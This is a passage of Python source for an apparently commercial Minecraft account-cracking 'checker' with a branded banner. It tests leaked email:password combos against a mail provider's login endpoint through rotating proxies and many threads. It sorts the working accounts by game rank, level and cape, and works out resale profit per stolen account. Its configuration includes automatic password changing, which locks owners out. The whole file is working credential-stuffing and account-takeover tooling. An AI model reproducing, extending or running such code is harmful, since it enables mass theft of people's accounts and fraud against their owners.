                    f'{Fore.CYAN}[Capture] - NoHypixel Login | {combo}{Fore.RESET}')
                Counter.nohypixel += 1
                open(f'{self.folder}/Hypixel/NoLogin.txt',
                     'a', encoding='u8').write(f'{combo}\n')
        return both

    def mailaccesz(self, email, password):
        mailaccesz = False
        if Checker.emailaccess:
            try:
                ans = scraper.get(
                    url=f'https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login={email}&Password={password}',
                    headers=self.mailheaders).text
            except Exception as e:
                if self.debug:
                    self.prints(f'{Fore.RED}Error Mail Access: \n{e}')
                ans = 'BAD'
            if 'Ok=1' in ans:
                mailaccesz = True
                Counter.ma += 1
                Counter.emailaccess += 1
                Counter.hits += 1
                self.prints(
                    f'{Fore.CYAN}[Capture] - MFA | {email}:{password}{Fore.RESET}')
                open(f'{self.folder}/MFA.txt', 'a',
                     encoding='u8').write(f'{email}:{password}\n')
        return mailaccesz

    def cpm_counter(self):
        while True:
            checked = Counter.hits + Counter.bad
            sleep(1)
            awa = (Counter.hits + Counter.bad) - checked
            Counter.cpm = awa * 60

    def cpmm(self):
        while True:
            checked = counter.bad + counter.mailaccessss
            sleep(1)
            awa = (counter.mailaccessss + counter.bad) - checked
            counter.cpm = awa * 60
            if Checker.RPC.discordrpc and self.rpcwork == 1:
                RPC.update(details="Checked: " + str(counter.mailaccessss + counter.bad) + " Cpm: " + str(counter.cpm), large_image="minecraft")

    def proxy_cpm(self):
        while True:
            checked = Counter.invalid + Counter.mojangunbanned
            sleep(1)
            awa = (Counter.invalid + Counter.mojangunbanned) - checked
            Counter.proxycpm = awa * 60

    def advancedcounters(self):
        while True:
            Total = len(self.accounts)
            Checked = Counter.hits + Counter.bad
            hitsd = round(Counter.hits / Total * 100, 2)
            badd = Counter.bad / Total * 100
            stuff = Checked / Total * 100
            Counter.checkedpercent = round(stuff, 2)
            Counter.failedpercent = round(badd, 2)
            Counter.hitspercent = round(Counter.hits / Total * 100, 2)
            if Checked > 1:
                Counter.guess = Counter.hits / Checked * Total
                ma1 = Counter.ma * Checker.profit.pmfa
                sf1 = Counter.sf * Checker.profit.psfa
                nf1 = Counter.nf * Checker.profit.pnfa
                lbm1 = Counter.lbm * Checker.profit.plbm
                mj1 = Counter.mj * Checker.profit.pmj
                pog1 = Counter.pog * Checker.profit.pog
                hr1 = Counter.hr * Checker.profit.phr
                hl1 = Counter.hl * Checker.profit.phl
                vr1 = Counter.vr * Checker.profit.pvr
                hr2 = Counter.hr1 * Checker.profit.phr1
                topkek = (ma1 + sf1 + nf1 + lbm1 + mj1 + pog1 +
                          hr1 + hl1 + vr1 + hr2 - Checker.profit.pcombo)
                Counter.profit = round(topkek)

    def prints(self, line):
        lock.acquire()
        print(f'{line}')
        lock.release()

    def playsound(self):
        while True:
            pass

    def mineplex(self, username, combo):
        both = [False, False]
        if Checker.Rank.mineplex_rank or Checker.Level.mineplex:
            try:
                response = requests.get(f'https://www.mineplex.com/players/{username}',
                                        headers=self.mailheaders).text
                if 'That player cannot be found.' in response:
                    both[0] = False
                    both[1] = False
                else:
                    both[0] = str(rankmp.search(response).group(1))
                    both[1] = int(levelmp.search(response).group(1))
                    if both[0] == '':
                        both[0] = False
            except Exception as error:
                if Checker.debug:
                    self.prints(f'{Fore.RED}Mineplex ERROR\n{error}')
            if both[0]:
                Counter.mineplex_ranked += 1
                self.prints(
                    f'{Fore.CYAN}[Capture] - Mineplex ranked | [{both[0]}] {combo}{Fore.RESET}')
                open(f'{self.folder}/Mineplex/Ranked.txt', 'a',
                     encoding='u8').write(f'[{both[0]}] {combo}  \n')
                if both[1] and Checker.Rank.mineplex_rank:
                    if both[1] >= Checker.Level.mineplex_level:
                        Counter.mineplex_leveled += 1
                        self.prints(
                            f'{Fore.CYAN}[Capture] - Mineplex level | [{str(both[1])}] {combo}')
                        open(f'{self.folder}/Mineplex/Highlevel.txt', 'a',
                             encoding='u8').write(f'[{str(both[1])}] {combo} \n')
        return both

    def proxyupdateder(self):
        while True:
            if not self.proxyapi:
                read_files = glob('proxies/*.txt')
                self.proxylist = []
                for file in read_files:
                    proxylistt = open(file, 'r', encoding='u8',
                                      errors='ignore').read().split('\n')
                    for line in proxylistt:
                        self.proxylist.append(f'{line}')
                    print(
                        f'{Fore.CYAN}[Proxy] Proxies Refreshed there are now {len(self.proxylist)}')
                    sleep(60)
                    continue

    @staticmethod
    def lisr():
        lisr = ['@gmail.com', '@yahoo.com', '@hotmail.com', '@aol.com', '@hotmail.co.uk', '@hotmail.fr', '@msn.com',
                '@yahoo.fr', '@wanadoo.fr', '@orange.fr', '@comcast.net', '@yahoo.co.uk', '@yahoo.com.br',
                '@yahoo.co.in', '@live.com', '@rediffmail.com', '@free.fr', '@gmx.de', '@web.de', '@yandex.ru',
                '@ymail.com', '@libero.it', '@outlook.com', '@uol.com.br', '@bol.com.br', '@mail.ru', '@cox.net',
                '@hotmail.it', '@sbcglobal.net', '@sfr.fr', '@live.fr', '@verizon.net', '@live.co.uk',
                '@googlemail.com', '@yahoo.es', '@ig.com.br', '@live.nl', '@bigpond.com', '@terra.com.br', '@yahoo.it',
                '@neuf.fr', '@yahoo.de', '@alice.it', '@rocketmail.com', '@att.net', '@laposte.net', '@facebook.com',
                '@bellsouth.net', '@yahoo.in', '@hotmail.es', '@charter.net', '@yahoo.ca', '@yahoo.com.au',
                '@rambler.ru', '@hotmail.de', '@tiscali.it', '@shaw.ca0.1%', '@yahoo.co.jp', '@sky.com',
                '@earthlink.net', '@optonline.net', '@freenet.de', '@t-online.de', '@aliceadsl.fr', '@virgilio.it',
                '@home.nl', '@qq.com', '@telenet.be', '@me.com', '@yahoo.com.ar', '@tiscali.co.uk', '@yahoo.com.mx',
                '@voila.fr', '@gmx.net', '@mail.com', '@planet.nl', '@tin.it', '@live.it', '@ntlworld.com', '@arcor.de',
                '@yahoo.co.id', '@frontiernet.net', '@hetnet.nl', '@live.com.au', '@yahoo.com.sg', '@zonnet.nl',
                '@club-internet.fr', '@juno.com', '@optusnet.com.au', '@blueyonder.co.uk', '@bluewin.ch', '@skynet.be',
                '@sympatico.ca', '@windstream.net', '@mac.com', '@centurytel.net', '@chello.nl', '@live.ca', '@aim.com',
                '@bigpond.net.au']
        return lisr

    def scrambled(self, ob):
        dest = ob[:]
        shuffle(dest)
        return dest

class Checker:
    try:
        auto_login = bool(config['checker']['autologin'])
        username = str(config['checker']['username'])
        password = str(config['checker']['password'])
        printbadd = bool(config['checker']['Print_fail'])
        retries = int(config['checker']['retries'])
        timeout = int(config['checker']['timeout']) / 1000
        threads = int(config['checker']['threads'])
        emailaccess = bool(config['checker']['mail_access'])
        save_bad = bool(config['checker']['save_bad'])
        debug = bool(config['checker']['debugging'])

        class profit:
            profit = bool(config['checker']['profit']['profit'])
            pcombo = int(config['checker']['profit']['Combolist price'])
            pnfa = int(config['checker']['profit']['NFA'])
            psfa = int(config['checker']['profit']['SFA'])
            pmfa = int(config['checker']['profit']['MFA'])
            pmj = int(config['checker']['profit']['Mojang Cape'])
            pof = int(config['checker']['profit']['Optifine Cape'])
            plbm = int(config['checker']['profit']['Labymod Cape'])
            plb = int(config['checker']['profit']['Liquidbounce Cape'])
            pog = int(config['checker']['profit']['Og/3letter nick'])
            pmpr = int(config['checker']['profit']['Mineplex Ranked'])
            pmpl = int(config['checker']['profit']['Mineplex Leveled'])
            phr = int(config['checker']['profit']['Hypixel Ranked'])
            phl = int(config['checker']['profit']['Hypixel Leveled (25+)'])
            pvr = int(config['checker']['profit']['Velt Ranked'])
            phr1 = int(config['checker']['profit']['Hive Ranked'])

        class RPC:
            discordrpc = bool(config['checker']['RPC']['DiscordRPC'])

        class Cape:
            optifine = bool(config['checker']['capes']['optifine'])
            labymod = bool(config['checker']['capes']['labymod'])
            minecon = bool(config['checker']['capes']['minecon'])

        class Rank:
            hypixel_rank = bool(config['checker']['rank']['hypixel'])
            mineplex_rank = bool(config['checker']['rank']['mineplex'])
            hivemc_rank = bool(config['checker']['rank']['hivemc'])
            veltpvp_rank = bool(config['checker']['rank']['veltpvp'])
            wynncraft_rank = bool(config['checker']['rank']['wynncraft'])

        class Level:
            hypixel = bool(config['checker']['level']['hypixel'])
            hypixel_level = int(config['checker']['level']['hypixel_level'])
            mineplex = bool(config['checker']['level']['mineplex'])
            mineplex_level = int(config['checker']['level']['mineplex_level'])

        class Proxy:
            proxy = bool(config['checker']['proxy']['proxy'])
            type = str(config['checker']['proxy']['proxy_type'])
            mail_proxy = bool(config['checker']['proxy']
                              ['mailcheck_use_proxy'])
            proxy_api = bool(config['checker']['proxy']['proxy_api'])
            proxy_api_link = str(config['checker']['proxy']['api_link'])

        class Uhc:
            uhc = bool(config['checker']['uhc']['check_uhc'])
            uhcminc = int(config['checker']['uhc']['uhc_coins'])

        class Skywars:
            skywars = bool(config['checker']['skywars']['check_skywars'])
            scoins = int(config['checker']['skywars']['skywars_coins'])

        class Bedwars:
            bedwars = bool(config['checker']['bedwars']['check_bedwars'])
            bwlevel = int(config['checker']['bedwars']['bwlevel'])

        class ProxyChecker:
            pcthreads = int(config['checker']['proxychecker']['pc_threads'])
            pctimeout = int(config['checker']['proxychecker']['pc_timeout'])

        class PasswordChanger:
            passwordchanger = bool(
                config['checker']['passwordchanger']['autochange'])
            newpassword = str(
                config['checker']['passwordchanger']['new_password'])
    except KeyError:
        print(f'{Fore.CYAN}Config is outdated, deleting...')
        os.remove('config\config.yml')
        os.remove('config\config.txt')
        os.remove('config\og-name.txt')
        os.rmdir('config')
        print(f'{Fore.GREEN}Deleted')
        print(f'{Fore.CYAN}Please restart the checker\n')
        input('Press ENTER to exit')
        exit()

class Register():
    def out(self):
        print("""
        1.Login
        2.Register
        """)
        ans = input("Select Option: ")
        if ans == "1":
            if Checker.auto_login:
                username = Checker.username
                password = Checker.password
                keyauthapp.login(username, password)
                Main()
            else:
                username = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(username, password)
                Main()

        if ans == "2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user, password, license)

if __name__ == '__main__':
    from cloudscraper import create_scraper
    import requests
    from requests import Session, exceptions

    agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.30'
    scraper = create_scraper(sess=Session(), browser={'custom': agent})
    import requests
    from glob import glob
    from re import findall
    from threading import Thread, Lock

    lock = Lock()
    session = Session()
    levelmp = compilee(r'>Level (.*)</b>')
    rankmp = compilee(r'class=\"www-mp-rank\".*>(.*)</span>')
    something = compilee(r'class=\"stat-value \".*>(.*)</span>')
    from colorama import Fore
    s = Register()
    t = f'''
{Fore.GREEN}███╗   ███{Fore.GREEN}╗██╗███╗   ██╗███{Fore.GREEN}████╗ ██████╗██████╗  {Fore.GREEN}█████╗ ███████╗█████{Fore.GREEN}██╗    ██╗  ██╗███████╗██╗  ██╗
████╗ {Fore.GREEN}████║██║████╗  ██║██╔═══{Fore.GREEN}═╝██╔════╝██╔══██╗██{Fore.GREEN}╔══██╗██╔════╝╚══██╔══╝    ██║ ██╔╝██{Fore.WHITE}╔════╝██║ ██╔╝
██╔████╔█{Fore.WHITE}█║██║██╔██╗ ██║████{Fore.WHITE}█╗  ██║     ██████╔╝███{Fore.WHITE}████║█████╗     ██║       ███{Fore.WHITE}██╔╝ █████╗  █████╔╝ 
██║╚██╔{Fore.WHITE}╝██║██║██║╚██╗██║██╔══{Fore.WHITE}╝  ██║     ██╔══██╗██╔══██{Fore.WHITE}║██╔══╝     ██║       ██{Fore.WHITE}╔═██╗ ██╔══╝  ██╔═██╗ 
██║ ╚═╝ ██║██║██║ ╚████║███████╗╚██████╗██║  ██║██║  ██║██║        ██║       ██║  ██╗███████╗██║  ██╗
╚═╝     ╚═╝╚═╝╚═╝ {Fore.WHITE} ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═{Fore.WHITE}╝╚═╝  ╚═╝╚═╝       {Fore.WHITE} ╚═╝       ╚═{Fore.WHITE}╝  ╚═╝╚══════╝╚═╝  ╚═╝

    '''
    print(t)
    s.out()
    Main()
